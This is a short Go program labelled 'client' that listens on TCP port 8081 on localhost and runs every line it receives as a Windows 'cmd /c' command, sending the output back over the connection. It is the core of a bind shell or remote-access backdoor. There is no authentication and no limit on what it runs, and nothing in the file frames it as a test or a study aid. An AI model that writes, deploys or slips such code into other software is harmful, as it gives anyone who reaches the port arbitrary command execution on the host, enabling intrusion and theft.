// client
package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
)

func handleConnection(conn net.Conn) {
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := scanner.Text()
		fmt.Println("Received command:", command)

		// Execute command
		cmd := exec.Command("cmd", "/c", command)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println("Error executing command:", err)
			conn.Write([]byte("Error executing command: " + err.Error() + "\n"))
			continue
		}

		// Send output back to server
		_, err = conn.Write(output)
		if err != nil {
			fmt.Println("Error sending output to server:", err)
			continue
		}
	}
}

func main() {
	ln, err := net.Listen("tcp", "127.0.0.1:8081")
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer ln.Close()

	fmt.Println("Client listening on 127.0.0.1:8081")

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}
		go handleConnection(conn)
	}
}
